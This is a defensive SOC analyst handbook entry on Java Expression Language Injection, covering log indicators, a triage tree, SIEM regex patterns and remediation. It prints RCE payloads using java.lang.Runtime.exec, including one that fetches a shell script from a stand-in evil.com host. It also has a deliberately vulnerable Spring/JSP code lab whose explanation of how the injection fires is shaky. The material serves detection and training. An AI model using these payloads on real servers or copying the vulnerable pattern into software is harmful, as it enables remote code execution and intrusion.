

# 📘 SOC Analyst Handbook: Expression Language Injection (ELI)

**Category:** Web Application Security / Injection
**Severity:** Critical (Leads to RCE)
**Skill Level:** Advanced

---

### 1. The Concept (What & Why)

**The Analogy (ELI5)**
Imagine a restaurant kitchen. The chef uses a label maker (Expression Language) to dynamically print labels for food containers.
*   **Normal:** The waiter inputs "Tomato Soup," and the label maker prints `[Tomato Soup]`.
*   **ELI Attack:** The waiter inputs `[Machine: Print all recipes and unlock the safe]`. The label maker, instead of just printing the text, reads the brackets, assumes it's an internal admin command, and executes it.

**The Technical Definition**
Expression Languages (EL) are used in web frameworks (specifically Java-based frameworks like Spring, JSP, and JSF) to dynamically bind backend objects/variables to front-end web pages. 
**Expression Language Injection (ELI)** occurs when an application takes untrusted user input and evaluates it as an Expression Language statement. This allows an attacker to inject Java code that the server will execute, almost always leading to **Remote Code Execution (RCE)**.

*Note: ELI is conceptually identical to SSTI (Entry #40), but ELI is specific to Java architectures (JSP, Spring).*

---

### 2. The Attack Mechanism

#### **How it works**
1.  **Vulnerable Code:** A Java Spring application accepts a parameter (like `userId`) and passes it into a view/template without validation.
2.  **The Probe:** An attacker injects a basic math equation wrapped in EL syntax: `${1+1}`.
3.  **The Result:** If the server returns `2`, the attacker has confirmed the application is vulnerable. The server evaluated the math instead of treating it as a string.
4.  **The Exploit:** The attacker leverages the `java.lang.Runtime` class to execute operating system commands (e.g., `${T(java.lang.Runtime).getRuntime().exec('id')}`).

---

### 3. The Detective's Lens (Logs & Patterns)

As a SOC Analyst, you are hunting for **Java Class Invocation** wrapped inside EL syntax (`${...}`) in URL parameters, POST bodies, or HTTP Headers.

#### **Key Indicators (The Syntax)**
Look for these specific characters and Java classes in web logs:
*   **The Brackets:** `${ ... }` or `#{ ... }`
*   **Java Classes (Critical):** `java.lang.Runtime`, `ProcessBuilder`, `System`.
*   **Java Methods:** `.exec()`, `.invoke()`, `.forName()`.
*   **Spring/JSP Scopes:** `request.getSession()`, `pageContext`, `sessionScope`.

#### **Example Log Snippet (Nginx)**
```text
123.456.78.9 - - [10/May/2023:14:30:01] "GET /vulnerable_endpoint?param=$%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27ls%27%29%7D HTTP/1.1" 200 496 "-" "Mozilla/5.0..."
```
*   **Analysis:**
    *   **Payload:** URL-encoded. `%7B` is `{`, `%28` is `(`, `%27` is `'`. 
    *   **Decoded:** `${T(java.lang.Runtime).getRuntime().exec('ls')}`
    *   **Verdict:** The attacker successfully executed the `ls` (list directory) command on the underlying Linux server.
    *   **Status 200 OK:** The server accepted and processed the payload. **Critical Breach.**

---

### 4. Investigation Steps (The Playbook)

**Step 1: Decode & Identify the Payload**
*   Use CyberChef (URL Decode). 
*   If you see `java.lang`, you are dealing with ELI (or Java Deserialization).

**Step 2: Determine Success (Status Codes)**
*   **200 OK:** The attack likely succeeded. If they ran an OS command, you must check Endpoint logs (EDR) to see if a shell was spawned.
*   **500 Internal Error:** The attacker made a syntax error in their Java payload. The attack failed, but the server is definitely vulnerable. 

**Step 3: Check for Out-of-Band (OOB) Exfiltration**
*   If the attacker executed OS commands, they likely used `curl` or `wget` to download a reverse shell or exfiltrate data. Check NetFlow/Firewall logs for outbound connections from the Web Server.

---

### 💻 5. Code Lab: Vulnerable Spring Application

Understanding why this happens on the backend.

**The Java Controller (Vulnerable Source):**
```java
@Controller
public class UserController {
    @Autowired
    private UserService userService;

    // ... listUsers method omitted for brevity ...

    @RequestMapping("/userDetails")
    public String userDetails(Model model, HttpServletRequest request) {
        // FLAW: Takes raw user input directly from the URL parameter
        String userId = request.getParameter("userId"); 
        
        User user = userService.getUserById(userId);
        model.addAttribute("user", user);
        return "userDetails";
    }
}
```

**The JSP View (Where Execution Happens):**
```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<h2>User Details</h2>

<!-- FLAW: The value is evaluated dynamically. If 'user.balance' contains 
     the attacker's injected string, it will execute as Java code! -->
<c:set var="balance" value="${user.balance}" />

<p>Name: ${user.name}</p>
<p>Balance: ${balance}</p>
```
*   **The Exploit:** An attacker modifies the `userId` parameter in the URL. If they can manipulate the database to return an EL payload like `${1+1}` or `${T(java.lang.Runtime).getRuntime().exec('id')}` as their "balance", the JSP page will dynamically evaluate and execute it.

---

### 🌳 6. Mini Decision Tree (Triage Logic)

*   **🟢 Low Priority (Blocked Noise)**
    *   `WAF Action: Blocked` + `Payload: ${1+1}`
    *   *Action:* Ignore. Automated scanner checking for ELI.
*   **🟡 Medium Priority (Vulnerability Confirmed, Exploit Failed)**
    *   `Status: 500 Error` + `Payload: ${T(java.lang.Runtime)...}`
    *   *Action:* The attacker proved the site is vulnerable but broke the syntax. Send an emergency patch ticket to the dev team.
*   **🔴 High Priority (Session Hijacking / Data Leak)**
    *   `Status: 200 OK` + `Payload: ${request.getSession().setAttribute('admin', 'true')}`
    *   *Action:* **Incident.** The attacker manipulated their session token to gain admin rights. Force logout all users.
*   **🟣 Critical Priority (Remote Code Execution)**
    *   `Status: 200 OK` + `Payload: ${T(java.lang.Runtime).getRuntime().exec('wget http://evil.com/shell.sh')}`
    *   *Action:* **Isolate Server.** The attacker downloaded a web shell. Incident Response required.

---

### 7. Remediation & Defense

**Immediate Actions (SOC)**
1.  **Block the IP:** Add the source IP to the firewall blocklist.
2.  **SIEM Regex:** Implement these Regex patterns in your SIEM to catch ELI attempts:
    *   *General ELI Syntax:* `GET.*\$\%7b.*\%7d.*HTTP\/.*` (Matches `GET ... ${ ... } ... HTTP/`)
    *   *Java RCE Specific:* `GET.*ProcessBuilder|java\.lang\.Runtime.* HTTP\/.*`
3.  **WAF Tuning:** Ensure your WAF blocks `java.lang.Runtime` and `ProcessBuilder` strings in HTTP GET/POST parameters.

**Long-term Fixes (Engineering)**
1.  **Input Validation:** Use strict whitelists (e.g., if `userId` is expected, ensure the input is *only* numeric before processing it).
2.  **Avoid User Input in Evaluation:** Never pass raw user input into functions that dynamically evaluate code or expressions.

---

### 🎯 8. MITRE ATT&CK Mapping
*   **T1190:** Exploit Public-Facing Application.
*   **T1059:** Command and Scripting Interpreter (If OS commands are executed via ELI).

---

### 9. Interview Summary (TL;DR)
*   **What it is:** Injecting malicious expressions into Java-based web frameworks (Spring, JSP) that the server evaluates as code.
*   **How it differs from XSS:** XSS attacks the user's browser. ELI attacks the backend server.
*   **The Ultimate Goal:** RCE (Remote Code Execution) using the `java.lang.Runtime` class.
*   **Key Log Indicators:** `${ ... }` syntax and Java classes in URL parameters.
*   **Verification:** A `200 OK` response to a `Runtime.exec` payload means the server was successfully compromised.
